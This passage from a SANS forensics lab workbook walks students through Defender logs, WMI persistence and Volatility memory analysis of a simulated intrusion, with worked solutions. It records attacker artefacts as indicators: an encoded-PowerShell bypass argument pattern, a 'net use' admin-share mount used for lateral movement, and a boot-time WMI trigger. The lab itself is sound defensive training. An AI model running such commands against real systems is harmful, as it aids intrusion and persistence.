• Why would the Microsoft Edge browser be executing PowerShell commands? Doesn't that seem unusual? Deﬁnitely!
Document this in your host-based artifacts list as we will get a much better understanding of what is happening here
in an upcoming section.

6. O ptional Homework: Spend some time reviewing the transcripts present in E:\C\Users\rsydow-a. Notice that a majority of the
PowerShell activity recorded appears to be legitimate administrator actions. On what day does that change? This is a great
opportunity to compare normal PowerShell logs with those related to attacker activity.

.

Analyzing Microsoft Defender Logs
While advanced attackers can ultimately circumvent any host-based security product, they can rarely do so without spawning at
least some alerts during their initial failed attempts. These failures along the way provide clues in host-based security logs which
can provide a wealth of information to those paying attention. Stark Research Labs uses the Microsoft Defender suite and here we
will get a chance to interact with some generated logs.
Using the Event Log Explorer menu options File -> Open Log File and New API, open Microsoft-Windows-Windows
G:\Labs\event-logs
Defender%4Operational.evtx from the folder

Clear any existing ﬁlters and ﬁlter the log for Event ID(s) 1116-1119

202

© 2023 SANS Institute

.

1. Perform a quick review of the Microsoft Defender alerts. What malware suite predominates?
________________________________________________________________
Solution
CobaltStrike is listed as the identiﬁed threat in a majority of the alerts. If true, this is an exceedingly easy way to ﬁnd a very

.

stealthy attack framework!

2. Document the various ﬁle names and paths of the malicious processes as potential indicators of compromise.
________________________________________________________________

© 2023 SANS Institute

.

203

Solution
• C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
• C:\Windows\System32\SRLUpdate.exe
• C:\Windows\explorer.exe
• C:\Windows\System32\svchost.exe

3. A dvanced: Several of the processes identiﬁed appear to be Windows executables with the correct names and correct paths.
What type of advanced attack might explain this?
________________________________________________________________
Solution

.

Code injection is very common with advanced malware, forcing legitimate processes to execute malicious code. This has
many advantages for malware including camouﬂage, and the ability to evade some security tools due to a digitally signed
and trusted executable performing the action. We will cover this attack surface in much greater detail in the memory
forensics section of the class.
4. When did the persistence mechanism for SRLUpdate.exe get removed?
________________________________________________________________

204

© 2023 SANS Institute

.

Solution
• Microsoft Defender not only removed the previously identiﬁed C:\Windows\System32\SRLUpdate.exe binary, but also
found and removed its persistence mechanism (a scheduled task named SRL User Maintenance) on 2023-01-25
00:41:57. Impressive!
• This is the reason why we were unable to ﬁnd the XML ﬁle for this scheduled task in the C:\Windows\System32\Tasks
folder in a previous exercise.

5. Advanced: Given the Microsoft Defender alert names, what types of activity was being accomplished via msedge.exe?

.

________________________________________________________________
________________________________________________________________
Solution
• Kekeo: Kekeo is an open source tool capable of a vast array of Windows credential attacks
• PowerRunner: Doing an online search for this alert does not provide much context. However, given the "Power" in the
name and the fact we previously saw msedge.exe as the host application in a PowerShell transcript, a good guess
would be some sort of PowerShell payload.

© 2023 SANS Institute

.

205

6. Microsoft Defender MPLog ﬁles, also known as Microsoft Defender Antivirus log ﬁles, are generated by the Microsoft Defender
antivirus program. These log ﬁles contain detailed information about the activities and events related to the scanning and
protection processes performed by Microsoft Defender. MPLog ﬁles are primarily used for diagnostic and troubleshooting
purposes, but they can also provide valuable insights into system activity. MPLog ﬁles are in text form and can be opened and
viewed using a text editor.
In your mounted Triage image, traverse to the E:\C\ProgramData\Microsoft\Windows Defender\Support folder.
MPDetection-20230123-095120.log and

• First we will get a feel for the contents of the MPDetection logs. Right-click on
open with the Notepad++ viewer. You will notice the contents closely match what was previously discovered in the

.

Microsoft Defender event log. How many entries in this log refer to the remediated scheduled task for SRLUpdate.exe?
________________________________________________________________

206

© 2023 SANS Institute

.

Solution
MPDetection logs can hold a more succinct version of the data present in the Microsoft Defender event logs. This log has
four (4) separate entries related to the remediation of the scheduled task for SRLUpdate.exe, all written at the same time.
Microsoft Defender was thorough!

• Now open the more comprehensive MPLog ﬁle. Right-click on MPLog-20230121-192504.log and open with the Notepad++
viewer. This is a large log and will require searching and/or ﬁltering to be used effectively. While the MPLog could have a
bit more information about malware detections than what was seen in the Microsoft Defender log, its process execution
tracking is even more valuable. We will conduct several searches for indicators of compromise to demonstrate its value.

.

• Search the MPLog for srlupdate.exe. Press CTRL-F in Notepad++ and use the Find All in Current Document feature.

What is the earliest time we know SRLUpdate.exe was running on the system? Document a few interesting processes
it interacted with, causing alarm within Microsoft Defender.

© 2023 SANS Institute

.

207

________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
Solution
• 2023-01-23T14:58:08.020Z (This appears to be a UTC timestamp due to the trailing "Z")
• Events were recorded for the "tainting" of iexplore.exe, msedge.exe, and svchost.exe
• This is important information for us because previously all we knew was when the ﬁle was removed by
Microsoft Defender. Now we know the executable was present on the system for multiple days before
detection and acting suspiciously (we suspect "tainting" to have something to do with code injection
techniques and will see more evidence of this in the memory forensics section).

• Now search the MPLog for STUN.exe. What is the earliest time we know STUN.exe was running on the system?
________________________________________________________________

.

Solution
• 2023-01-22T02:25:04.260Z (This appears to be a UTC timestamp due to the trailing "Z")
• Note that the earliest entry in this log is 2023-01-22 00:25:04, so we do not know if this is the ﬁrst time
STUN.exe was executed. Given how close the ﬁrst recorded time is to the beginning of the log, it is likely
STUN.exe was running even earlier.
• Keep in mind that the Microsoft Defender log had not (yet) recorded an alert on STUN.exe. But the MPlog
indicates it was being watched!

• C hallenge: What strange ﬁle appears to be related to STUN.exe?
________________________________________________________________

208

© 2023 SANS Institute

.

Solution
On 2023-01-25T00:51:44.881Z the ﬁle \Device\HarddiskVolume1\Windows\d.ger was scanned during analysis of
STUN.exe.

• Search for all occurrences of werfault.exe. Where was it located in the ﬁle system?
________________________________________________________________
________________________________________________________________
Solution
• \\dev01.shieldbase.com\c$\windows\services
• c:\windows\update

What could the original name of werfault.exe be?
________________________________________________________________

sdelete.exe

.

Solution

Can you ﬁnd any other related ﬁles to werfault.exe that could be interesting?
________________________________________________________________
Solution
• \Windows\Update\rec\exchange01.shieldbase.com.txt
• MPLogs record the ﬁle related to the executable taking the longest to scan. This text ﬁle is present in an
interesting directory.

© 2023 SANS Institute

.

209

Optional Homework: Searching for WMI Attacks
Starting with Windows Server 2012R2, the WMI Operational log records granular information on new WMI event ﬁlters and
consumers. This is an important development since there are few other scalable ways to detect these insidious persistence
mechanisms.
System RD01 does not have any interesting event consumers to analyze, but in a previous exercise you might recall ﬁnding
suspicious WMI activity on system WKSTN05. The WMI event log for that system was extracted and is now present in your Labs
folder. Use Event Log Explorer to open G:\Labs\event-logs\WKSTN05_Microsoft-Windows-WMI-Activity%4Operational.evtx

.

Filter for event ID 5861 to look for any new permanent event consumer creation.

1. Review the small number of EID 5861 events present in the log and identify the outlier WMI Event Consumer. Can you think of
three reasons this event consumer is suspicious?
________________________________________________________________
________________________________________________________________
________________________________________________________________

210

© 2023 SANS Institute

.

Solution
• The dates of the consumer creation are in the range of other suspicious activity found on the system.
• The event consumer is a CommandLineEventConsumer, one of the two types of consumers most commonly abused in
the wild.
• An executable from a known bad location is referenced in a new event consumer on the system: C:

.

\Windows\Update\narrator.exe

2. What is the Event ﬁlter trigger? How would you describe when the persistence mechanism triggers? (Hint: Look at the "Query")
________________________________________________________________

© 2023 SANS Institute

.

211

Solution
The most interesting part is: TargetInstance.SystemUpTime >= 201 AND TargetInstance.SystemUpTime < 323. This is a
common way to start an (evil) event consumer near boot time (approximately 201 seconds after boot).

3. How many suspicious event consumers are in the log? Are there any differences?
________________________________________________________________
________________________________________________________________
Solution
• There are three "Narrator" event consumers in the WKSTN05 WMI Activity Operational log.
• There do not appear to be any differences. The new WMI event consumer was likely logged after each reboot of the

.

system.

Lab Takeaways
• An encoded PowerShell script was discovered and could be residue from an attack tool. The argument pattern could be useful
for searching logs elsewhere in the environment:
• powershell -nop -exec bypass -EncodedCommand
• Good search terms help greatly in ﬁnding evil within PowerShell logs. The wacsvc account was responsible for over 800 script
block events logged within a ten minute period: 2023-01-17 19:03:57 to 2023-01-17 19:13:46. The activity looks like a
network reconnaissance scan. Transcript logs for the account provided additional context.
• Microsoft Defender identiﬁed multiple threats on RD01. CobaltStrike was listed as the identiﬁed threat in a majority of the
alerts. Code injection could have taken place in the following processes:
• C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
• C:\Windows\System32\SRLUpdate.exe

212

© 2023 SANS Institute

.

• C:\Windows\explorer.exe
• C:\Windows\System32\svchost.exe
• Microsoft Defender not only removed the previously identiﬁed C:\Windows\System32\SRLUpdate.exe binary, but also found
and removed its persistence mechanism (a scheduled task named SRL User Maintenance) on 2023-01-25 00:41:57.
• Microsoft Defender also identiﬁed possible PowerRunner and Kekeo credential stealing malware.
• MPLogs indicated werfault.exe could be sdelete.exe and the process was interacting with an interesting ﬁle named
\Windows\Update\rec\exchange01.shieldbase.com.txt
• MPLogs indicated the ﬁle \Windows\d.ger is related to STUN.exe
• An executable from a known bad location was referenced in a suspicious event consumer on WKSTN05: C:

.

\Windows\Update\narrator.exe. The persistence mechanism was set to start at boot.

© 2023 SANS Institute

.

213

FOR508 | ADVANCED INCIDENT RESPONSE, THREAT HUNTING, & DIGITAL FORENSICS
GIAC Certified Forensic Analyst (GCFA)

.

SRL Intrusion Exercise Workbook and Labs
Sections 3-5

THE MOST TRUSTED SOURCE FOR INFORMATION SECURITY TRAINING, CERTIFICATION, AND RESEARCH

.

|

sans.org

© 2023 SANS Institute All rights reserved to SANS Institute.
PLEASE READ THE TERMS AND CONDITIONS OF THIS COURSEWARE LICENSE AGREEMENT ("CLA") CAREFULLY
BEFORE USING ANY OF THE COURSEWARE (DEFINED BELOW) ASSOCIATED WITH THE SANS INSTITUTE COURSE.
THIS IS A LEGAL AND ENFORCEABLE CONTRACT BETWEEN YOU (THE “USER”) AND THE ESCAL INSTITUTE OF
ADVANCED TECHNOLOGIES, INC. /DBA SANS INSTITUTE (“SANS INSTITUTE”) FOR THE COURSEWARE. BY
ACCESSING THE COURSEWARE, USER AGREES TO BE BOUND BY THE TERMS OF THIS CLA.
With this CLA, SANS Institute hereby grants User a personal, non-exclusive license to use the Courseware subject to the
terms of this agreement. Courseware means all printed materials, including course books and lab workbooks, slides or notes,
as well as any digital or other media, audio and video recordings, virtual machines, software, technology, or data sets
distributed by SANS Institute to User for use in the SANS Institute course associated with the Courseware. User agrees that
the CLA is the complete and exclusive statement of agreement between SANS Institute and you and that this CLA supersedes
any oral or written proposal, agreement or other communication relating to the subject matter of this CLA.
BY ACCESSING THE COURSEWARE, USER AGREES TO BE BOUND BY THE TERMS OF THIS CLA. USER FURTHER
AGREES THAT ANY BREACH OF THE TERMS OF THIS CLA MAY CAUSE IRREPARABLE HARM AND SIGNIFICANT
INJURY TO SANS INSTITUTE, AND THAT SANS INSTITUTE MAY ENFORCE THESE PROVISIONS BY INJUNCTION
(WITHOUT THE NECESSITY OF POSTING BOND) SPECIFIC PERFORMANCE, OR OTHER EQUITABLE RELIEF.
If User does not agree to the terms of this CLA, User should not access the Courseware. User may return the Courseware to
SANS Institute for a refund, if applicable.
User may not copy, reproduce, re-publish, distribute, display, modify or create derivative works based upon all or any portion of
the Courseware, in any medium whether printed, electronic or otherwise, for any purpose, without the express prior written
consent of SANS Institute. Additionally, User may not sell, rent, lease, trade, or otherwise transfer the Courseware in any way,
shape, or form to any person or entity without the express written consent of SANS Institute.
If any provision of this CLA is declared unenforc.eable in any jurisdiction, then such provision shall be deemed to be severable
from this CLA and shall not affect the remainder thereof. An amendment or addendum to this CLA may accompany this
Courseware.
SANS Institute may suspend and/or terminate User’s access to and require immediate return of any Courseware in connection
with any (i) material breaches or material violation of this CLA or general terms and conditions of use agreed to by User; (ii)
technical or security issues or problems caused by User that materially impact the business operations of SANS Institute or
other SANS Institute customers, or (iii) requests by law enforcement or government agencies.

.

SANS Institute acknowledges that any and all software and/or tools, graphics, images, tables, charts or graphs presented in
this Courseware are the sole property of their respective trademark/registered/copyright owners, including:
AirDrop, AirPort, AirPort Time Capsule, Apple, Apple Remote Desktop, Apple TV, App Nap, Back to My Mac, Boot Camp,
Cocoa, FaceTime, FileVault, Finder, FireWire, FireWire logo, iCal, iChat, iLife, iMac, iMessage, iPad, iPad Air, iPad Mini,
iPhone, iPhoto, iPod, iPod classic, iPod shuffle, iPod nano, iPod touch, iTunes, iTunes logo, iWork, Keychain, Keynote, Mac,
Mac Logo, MacBook, MacBook Air, MacBook Pro, Macintosh, Mac OS, Mac Pro, Numbers, OS X, Pages, Passbook, Retina,
Safari, Siri, Spaces, Spotlight, There’s an app for that, Time Capsule, Time Machine, Touch ID, Xcode, Xserve, App Store, and
iCloud are registered trademarks of Apple Inc.
PMP® and PMBOK® are registered trademarks of PMI.
SOF-ELK® is a registered trademark of Lewes Technology Consulting, LLC. Used with permission.
SIFT® is a registered trademark of Harbingers, LLC. Used with permission.
REMnux® is a registered trademark of Zeltser Security Crop. Used with permission.
VMware Workstation Pro®, VMWare Workstation Player®, VMWare Fusion®, and VMware Fusion Pro® are registered
trademarks of VMware, Inc. Used with permission.
Governing Law: This Agreement shall be governed by the laws of the State of Maryland, USA.
Courseware licensed to User under this Agreement may be subject to export laws and regulations of the United States of
America and other jurisdictions. User warrants he or she is not listed (i) on any sanction programs list maintained by the U.S.
Office of Foreign Assets Control within the U.S. Treasury Department (“OFAC”), or (ii) denied party list maintained by the U.S.
Bureau of Industry and Security within the U.S. Department of Commerce (“BIS”). User agrees to not allow access to any
Courseware to any person or entity in a U.S. embargoed country or in violation of a U.S. export control law or regulations.
User agrees to cooperate with SANS Institute as necessary for SANS Institute to comply with export requirements and
recordkeeping required by OFAC, BIS or other governmental agency.
All reference links are operational in the browser-based delivery of the electronic workbook.
FOR508_W2_I01_01

.

Lab 3.1: Identify Rogue Processes
Objectives
1. Gain experience with Volatility, a popular memory analysis tool
2. Understand the various ways to analyze EPROCESS information
3. Practice ﬁnding anomalies based on process trees
4. Use a baseline to narrow focus and ﬁnd anomalies

Lab Preparation
This lab is completed in your 508 SIFT LINUX VM
Launch the 508 SIFT LINUX VM and log in.
• LOGIN = sansforensics
• PASSWORD = forensics

.

Open a new terminal if one is not present:

Elevate privileges, change directory to the /cases/memory folder, and verify that the rd01-memory.img ﬁle is present.
sudo su

cd /cases/memory

ls

© 2023 SANS Institute

.

1

Note
It is recommended to work under a root context (sudo su) as some tools or plugins may not operate as expected without
elevated permissions.

Tip
This might be the ﬁrst time you are using the Linux VM for this class. If you have not already, please update your electronic
workbook to make sure you have the most up-to-date lab information.
If your classroom does not provide Internet access, this update will need to be performed outside of class. If there are
important corrections not available in the packaged version in the VM, your instructor will advise you of any necessary ﬁxes.
The electronic workbook is stored locally in the VM so that it is always available. However, occasionally the course authors will
update the source content with minor ﬁxes, such as correcting typos or clarifying explanations. You can pull down any
available updates into the VM by running the following command in a bash terminal:
workbook-update

.

Troubleshooting
The latest memory analysis tools like Volatility 3, Memory Baseliner, and MemProcFS rely upon Internet access to look up
symbol tables from Microsoft servers. These symbol tables allow the tools to understand memory data structures in the wide
range of different versions of Windows that exist. If the tools completely fail to execute when running commands in the
following exercises, it could be because your virtual machine does not have an Internet connection. Check to see if you can
ping 8.8.8.8 and if not, troubleshoot your VM networking. The command dhclient can be used in Linux to use DHCP to

request an IP address. We expect any issues to be rare as we have also attempted to locally cache symbol data for the
memory images used in this class.

Lab Questions
Look for Suspicious Processes
Use the windows.psscan plugin to scan the memory image for EPROCESS blocks.
vol.py -f rd01-memory.img -r pretty windows.psscan > psscan.txt

cat psscan.txt

2

© 2023 SANS Institute

.

Take a minute to scan the process list. There are a lot of processes running on this system!
1. Do you see any previously identiﬁed malware in the process list? Document the name and process identiﬁer (PID) value.
________________________________________________________________
Solution
STUN.exe is present (PID 1912)

2. What two living off the land processes are most likely to be a result of hands on keyboard activity?
________________________________________________________________
________________________________________________________________
Solution

.

• cmd.exe (PID 6784)
• net.exe (PID 9128)
This is a bit of a subjective question and different analysts will identify different items of interest (there are a lot of
possible living off the land binaries). Our memory analysis process is designed so the analyst does not have to be perfect.
There will be many more opportunities to identify whatever might be missed in this step.

© 2023 SANS Institute

.

3

3. How many exited processes are present in the output?
grep -v "N/A" psscan.txt

________________________________________________________________
Solution
There are 10 exited processes present in the psscan output

Visualize Process Parent-Child Relationships

.

Use the windows.pstree plugin to visualize the process tree.
vol.py -f rd01-memory.img windows.pstree > pstree.txt

cat pstree.txt

1. What is the parent process of stun.exe ?
________________________________________________________________
Solution
svchost.exe (PID 1244)

4

© 2023 SANS Institute

.

2. What are the names of the child processes for stun.exe ? Do these seem like reasonable children for this process?
________________________________________________________________
________________________________________________________________
________________________________________________________________
Solution
• msedge.exe (three instances)
• conhost.exe
• If we were at all still contemplating whether STUN.exe is evil, seeing these strange child processes would likely put an
end to the deliberations. Seeing a browser process as a child of a random executable is very strange. You might also
recall identifying suspicious activity related to msedge.exe processes in a previous exercise . This is the reason why!
The conhost.exe process is also unusual. This process would typically be a child of a process like cmd.exe or
powershell.exe taking console input. Perhaps it is giving us a clue that STUN.exe is doing something similar.
• Tip: An easy command to identify the child items is

grep 1912 pstree.txt

3. C hallenge: The parent process for stun.exe is unexpected and provides a clue to better understanding the malware. Run the

.

following command to isolate the process tree output to just items related to the parent process and see if you can determine
why the parent process is relevant. Be careful, the answer is a little tricky!
vol.py -f rd01-memory.img windows.pstree --pid 1244

________________________________________________________________

© 2023 SANS Institute

.

5

Solution
The parent of svchost.exe is services.exe, which is expected for that process and seems to indicate svchost.exe might be
normal and not part of the malware (we will know more later when we look at the full command-line for the process). The
solution to the puzzle is the process taskhostw.exe, which is a child of the same svchost.exe process as STUN.exe. This
process is responsible for scheduled task execution, making this svchost.exe process (PID 1244) the background process
managing scheduled tasks. All of this tells us STUN.exe was executed as a scheduled task on this system.

4. Use the same technique to quickly identify the parent and any child processes of cmd.exe (PID 6784). Do the children and
parent process for cmd.exe seem normal?
________________________________________________________________

.

________________________________________________________________

6

© 2023 SANS Institute

.

Solution
• Parent: explorer.exe (PID 6664)
• Child: conhost.exe (PID 9872)
• Child: net.exe (PID 9128)
Everything looks normal for this process. Cmd.exe is a user application and thus its parent is commonly explorer.exe (the
user desktop). Conhost.exe is commonly associated with cmd.exe and net.exe is very likely an application run using
cmd.exe. While all of this appears normal, it still gives us interesting information about user activity on the system,
including the use of command-line tools and the net.exe application. We will dig deeper into these in an upcoming
exercise.

Develop Pivot Points
We previously documented suspicious activity related to msedge.exe processes. This process name is expected for the Microsoft
Edge web browser, but the way it is executing is anomalous. Narrow your focus to just the msedge.exe processes with the hope

.

they can be used as a pivot point to discover other forensic artifacts and attacker activity.
grep -i msedge psscan.txt

1. How many of the existing msedge.exe processes are still running (not exited) in the memory image? (Hint: you might need to
look at the header of your psscan output to refresh your memory on the column titles: head psscan.txt )
________________________________________________________________
Solution
Only one process was in an active (non-exited) state, PID 2524.

© 2023 SANS Institute

.

7

2. What are the parent processes of the msedge.exe processes (document PID and name)?
________________________________________________________________
________________________________________________________________
Solution
• STUN.exe (PID 1912)
• explorer.exe (PID 6664)
• Explorer.exe is the user desktop process and often the parent of applications executed by a user. At ﬁrst glance, this
could be an indication that its child msedge.exe processes could be the legitimate Microsoft Edge web browser
application.

3. Compare the creation times of all of the msedge.exe processes. Are the processes with different parents related?
________________________________________________________________
Solution
All of the processes started within approximately ﬁve minutes of one another. This seems to indicate they are likely
information.

.

related. Since we distrust the children of stun.exe, we would also have to distrust the children of explorer.exe given this new

4. Compare the creation and exit times of the terminated msedge.exe processes. Can you imagine what types of activities might
create this same pattern?
________________________________________________________________

8

© 2023 SANS Institute

.

Solution
Each exited msedge.exe process ran for only 2-3 seconds. This could indicate they were used for very quick or atomic
actions. As an example, each process could be responsible for running one command, returning data, and then exiting.

5. Optional Homework: We previously saw msedge.exe processes referenced in the Windows Microsoft-Windows-Windows
Defender%4Operational.evtx event log. See if you can correlate activity recorded in the log with what you see in memory. Can
you use this information to better explain the number of msedge.exe processes and the length of time they were running?
________________________________________________________________

.

________________________________________________________________

© 2023 SANS Institute

.

9

Solution
• Filtering the Microsoft-Windows-Windows Defender%4Operational.evtx log for msedge returns nine (9) events.
• Over half of the msedge.exe process creation times directly correspond to entries in the Microsoft Defender log.
• It is likely that at least some of the msedge.exe processes were running for such a short time because they were
terminated by Microsoft Defender. What we are seeing evidence of is an attacker attempting to execute code and
being repeatedly blocked by host-based security.
• Seeing alerts for msedge.exe processes with both stun.exe and explorer.exe as parents further strengthens our
suspicions that they are all related and could be an indication the attacker was trying different techniques to get

.

around the host-based security.

Optional Homework: Use a Baseline Image to Filter Process Output
You will ﬁnd baseline JSON ﬁles for a Stark Research Labs Win11x64 system in the folder /cases/memory/baseline. In this
optional lab, we will use a baseline to ﬁlter out the noise generated by processes common to "normal" SRL workstations.

Note
The Memory Baseliner tool takes a lot of time and system resources to run effectively. It is best to do this lab when you have
some extra time and don't mind your virtual machine being tied up several minutes. Alternatively, you can forgo running the
commands below and use an already precooked version located in

10

/cases/precooked/memory/proc_baseline.csv

© 2023 SANS Institute

.

Memory Baseliner leverages Volatility 3 to compare processes in a suspect image to those in a baseline memory image. To speed
up the process we will be leveraging a unique feature of the tool which is the ability to provide a pre-computed baseline in JSON
format, instead of the full baseline memory image. JSON ﬁles can be created once and then re-used whenever a view of that
particular baseline is needed. You could generate one for each type of system you are likely to encounter at work (workstations,
servers, etc.). JSON ﬁles are typically under one megabyte in size, making them much more portable and convenient than full
memory images. Here are the commands:
sudo su

cd /cases/memory

python3 /opt/memory-baseliner/baseline.py -proc -i rd01-memory.img --loadbaseline --jsonbaseline /cases/memory/
baseline/Win11x64_proc_baseline.json -o proc_baseline.csv

After processing completes, convert the output from pipe separated to comma separated:
sed -i 's/|/,/g' proc_baseline.csv

Copy the /cases/memory/proc_baseline.csv ﬁle (or precooked version noted above) to your 508 Windows VM to use the
Timeline Explorer viewer. Alternatively, copy it to your host if you prefer your own CSV viewer like Excel. Copying ﬁles between VMs
can be a bit tricky and what works on one system doesn't always work on another. We have documented several different ways to
transfer data into your virtual machines here: VM File Transfer Options
1. Take a moment to peruse the columns to see what data is available. You can use the Tools -> Reset Column Widths option in
Timeline Explorer to make everything ﬁt better on your screen. Notice the tool provides both command-line and loaded DLL
information. We did not provide the --showknown option when creating the output, so only items not present in the baseline

.

will be displayed.
2. Both processes and their loaded DLLs are baselined with the “-proc” option. This can be a lot of information. To initially limit
your data to just a list of process names, ﬁlter for .exe in the DLL NAME column. This works because the image binary (.exe)
will also be present in the loaded DLL list. Contrast how few items are present compared to what you previously analyzed in
the psscan output.
What processes in this list match suspicious ones we found earlier in the exercise?
________________________________________________________________
________________________________________________________________

© 2023 SANS Institute

.

11

Solution
• STUN.exe (PID 1912)
• net.exe (PID 9128)

Tip
Exited processes (like the msedge.exe processes found earlier) are not compared by this tool -- a good reminder to
know the strengths and limitations of your tools and to never rely upon just one tool!

the most interesting COMMAND LINE?

.

3. This is a small set of data (by design), making it easier to ingest a lot of information about each process. What process has

________________________________________________________________
Solution
• net.exe (PID 9128)
• This could be evidence of lateral movement!

12

© 2023 SANS Institute

.

4. Why do you think we do not see

cmd.exe

in the PROCESS NAME list?

________________________________________________________________
Solution
We see cmd.exe as the parent process of net.exe, but not listed as a process itself. The most likely explanation is it is
present in the baseline image and thus ﬁltered out. If we wanted to know for sure, we could re-run the Memory Baseliner
command and add the --showknown option to see everything.
5. Review the PPID (PARENT NAME) column. Which process is an orphan?
________________________________________________________________
Solution
• slack.exe (PID 6160)
• Other slack.exe processes have this process as a parent, but it is unknown what its parent might be. The SRL
organization uses Slack, but in a real world investigation it might be worth looking at a clean system to see if this is
normal behavior for that application. It not being in the baseline image is a little less concerning since user

.

applications often do not make it into baselines.

6. Clear your ﬁlters with CTRL-E and review the loaded DLLs for each process. Which process loads code from a user proﬁle?
________________________________________________________________

© 2023 SANS Institute

.

13

Solution
• slack.exe (PID 6160)
• This is a bit unusual, but sadly many third-party applications do the same. If we were to investigate Slack further and
ﬁnd out it is normal, we would likely want to get it into our baseline JSON so we would not have to review the same
ﬁndings again in the future.

7. If you would like to learn more baselining tricks, read this blog post as homework: https://for508.com/5yj68

.

Lab Takeaways

• Multiple suspicious processes were identiﬁed with the help of parent-child relationships:
• STUN.exe PID 1912
• cmd.exe PID 6784
• net.exe PID 9128
• explorer.exe PID 6664
• msedge.exe (seven instances)
• Relationships matter. STUN.exe and explorer.exe each had several child processes named msedge.exe
• The msedge.exe processes were all started within a short time period: 2023-01-25 14:56.42 to 2023-01-25 15:04:43
• Over half of the msedge.exe process creation times directly correspond to reported malware identiﬁcation in the Microsoft
Defender log.
• The sister process taskhostw.exe indicates STUN.exe was executed as a scheduled task.

14

© 2023 SANS Institute

.

Lab 3.2: Memory Process Objects
Objectives
1. Continue investigating a memory sample using the six-step process
2. Gain experience pivoting on data present in process objects
3. Practice memory analysis using a powerful new tool, MemProcFS
4. Analyze network connections found in memory
5. Identify useful indicators of compromise that can help scale our efforts and identify similar activity elsewhere in the network

Lab Preparation
The ﬁ rst part of this lab is completed in your 508 SIFT LINUX VM.
Launch the 508 SIFT LINUX VM and log in.
• LOGIN = sansforensics
• PASSWORD = forensics
This lab is a continuation of the previous memory analysis lab.
Elevate privileges, change directory to the /cases/memory folder, and verify that the rd01-memory.img ﬁle is present.

cd /cases/memory

.

sudo su

ls

Note
It is recommended to work under a root context ( sudo su ) as some tools or plugins may not operate as expected without
elevated permissions.

© 2023 SANS Institute

.

15

Lab Questions
Investigate Process Objects with Volatility
1. One of the most useful of all process objects is the process full path and command line.
Use the windows.cmdline plugin to identify the full path of the suspicious STUN.exe (PID 1912) process.
vol.py -f rd01-memory.img windows.cmdline --pid 1912

________________________________________________________________
Solution
C:\Windows\System32\STUN.exe

2. Use the windows.cmdline plugin to identify the full path and command line of the previously identiﬁed cmd.exe (PID 6784)
process. What is interesting about this command-line?
vol.py -f rd01-memory.img windows.cmdline --pid 6784

________________________________________________________________

Solution

.

________________________________________________________________

• cmd.exe C:\Windows\system32\cmd.exe /C net use H: \172.16.6.12\c$\Users
• The command-line for cmd.exe captured an executed command illustrating an administrative share (C$) being
mounting on 172.16.6.12

3. Reference the previous process list information in psscan.txt to identify the creation time of the net.exe process, telling us
when the connection to the remote system occurred. Document the time of lateral movement:
grep net\.exe psscan.txt

________________________________________________________________

16

© 2023 SANS Institute

.

Solution
• 2023-01-25 14:52:04
• When reviewing the system at IP address 172.16.6.12, you now have an exact time of interesting activity to pivot
around.

4. Now run the windows.cmdline plugin to identify all process command lines by omitting the "--pid" parameter. Take a moment
to review the wealth of extra data available for each process. Notice that exited processes typically lose their pointer to the
PEB where command line information is stored.
vol.py -f rd01-memory.img windows.cmdline > cmdline.txt

Use the grep command to ﬁlter the complete command line information for the previously identiﬁed msedge.exe processes.
Are they running from an expected location?
grep msedge cmdline.txt

________________________________________________________________
Solution
• The Process Environment Block (PEB) for exited processes is often unlinked when a process is terminated. Thus we
only see one command-line available for the still active msedge.exe process: C:\Program Files

.

(x86)\Microsoft\Edge\Application\msedge.exe
• If you check a known-good system or baseline you will see this is an expected location for this executable.

5. Token information for a suspected process can be useful to determine how it was spawned and with what permissions.
Run windows.getsids on the STUN.exe (PID 1912) process to identify the primary token (SID) and account name used to start
the process.
vol.py -f rd01-memory.img windows.getsids --pid 1912

• SID:______________________________________
• Account Name: ____________________________

© 2023 SANS Institute

.

17

• Built-In Account / User Account (pick one)
Solution
• SID: S-1-5-18
• Account Name: Local System
• Account Type: Built-In Account
• The SYSTEM account is the highest privileged account on a Windows computer

6. Run windows.getsids on the msedge.exe (PID 6028) process. Are the account permissions for this process normal?
vol.py -f rd01-memory.img windows.getsids --pid 6028

________________________________________________________________

• S-1-5-18 Local System

.

Solution

• This is a very unusual level of permissions for a browser process. It would be very dangerous to run a browser (like
Microsoft Edge) as the Local System account because if it were compromised, any associated malware would be
running with the highest available privileges on the system. The associated token tells us there is something wrong
with the process.

7. Run windows.getsids on the msedge.exe (PID 2524) process. Are the account permissions for this process normal? Does this
account have administrative privileges?

18

© 2023 SANS Institute

.

vol.py -f rd01-memory.img windows.getsids --pid 2524

________________________________________________________________
________________________________________________________________
Solution
• S-1-5-21-2838623409-1327563992-2591358621-1136 tdungan
• This is the normal permissions we would expect for a user process (user-level privileges). Since we previously
identiﬁed all of the msedge processes to be likely suspicious, this tells us they are running at different privilege levels
for some reason.
• This account does not appear to have admin rights on the system, based on group information provided by the

.

getsids plugin.

8. Execute the windows.getsids plugin to identify account and group information for all processes by omitting the "--pid"
parameter.
vol.py -f rd01-memory.img windows.getsids > getsids.txt

Now use the grep command to investigate all processes spawned by the tdungan account. Are there any surprises here?
grep tdungan getsids.txt

________________________________________________________________

© 2023 SANS Institute

.

19

Solution
• The tdungan account is the legitimate user of this system, so we would expect many processes to be tied to this
account. However, the cmd.exe and net.exe cmdline information previously discovered now ties this account to
suspicious activity. Further, several previously identiﬁed msedge.exe processes are running under the tdungan account
context. If we had not already marked this account down as compromised, this information should be enough to
convince us.

9. Process handles can be very helpful for conﬁrming suspicions, identifying malware variants, and identifying additional
objects to investigate.
Run the windows.handles plugin on the STUN.exe (PID 1912) process, focusing on ﬁle and registry key handles.
vol.py -f rd01-memory.img windows.handles --pid 1912 | egrep 'File|Key'

This process has only a few ﬁle and registry handles, but there is one potentially interesting named pipe. Find and document
it:

Solution

.

________________________________________________________________

• \Device\NamedPipe\ShellEx_16293
• There is no context to know if this named pipe will ultimately be interesting, but since we believe this process to be evil,
anything associated with it might turn out to be useful for ﬁnding the same malware elsewhere. In fact, in an
upcoming exercise we will prove this named pipe is related to the malware.

Introducing MemProcFS
This part of the lab will use the 508 Windows VM
Launch the 508 Windows VM and log in. You can suspend any other VMs to save system resources.
• LOGIN = SANSDFIR

20

© 2023 SANS Institute

.

• PASSWORD = forensics
Open an administrator command terminal, change directory to G:\SRL_Evidence\memory , and perform a directory listing
cd /d G:\SRL_Evidence\memory

dir /B

Start MemProcFS with the rd01-memory.img ﬁle (the value after "-forensic" is the number one):

.

